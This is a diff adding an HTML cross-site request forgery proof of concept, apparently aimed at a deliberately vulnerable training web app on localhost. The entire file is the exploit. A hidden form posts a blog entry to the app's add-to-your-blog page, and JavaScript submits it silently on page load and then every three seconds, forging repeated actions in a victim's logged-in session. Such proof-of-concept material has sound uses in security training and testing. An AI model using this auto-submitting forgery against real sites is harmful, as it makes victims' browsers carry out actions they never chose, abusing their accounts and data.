@@ -1,0 +1,24 @@
+<form name="myForm" id="myForm" target="_myFrame" action="http://127.0.0.1/index.php?page=add-to-your-blog.php" method="POST">
+    <p>
+        <input type="hidden" name="blog_entry" value="Post via csrf vuln"/>
+        <input type="hidden" name="add-to-your-blog-php-submit-button" value="Save+Blog+Entry"/>
+    </p>
+    <p>
+        <input type="submit" value="Submit" />
+    </p>
+</form>
+
+<script type="text/javascript">
+    window.onload=function(){
+        var auto = setTimeout(function(){ autoRefresh(); }, 100);
+
+        function submitform(){
+          document.forms["myForm"].submit();
+        }
+
+        function autoRefresh(){
+           clearTimeout(auto);
+           auto = setTimeout(function(){ submitform(); autoRefresh(); }, 3000);
+        }
+    }
+</script>
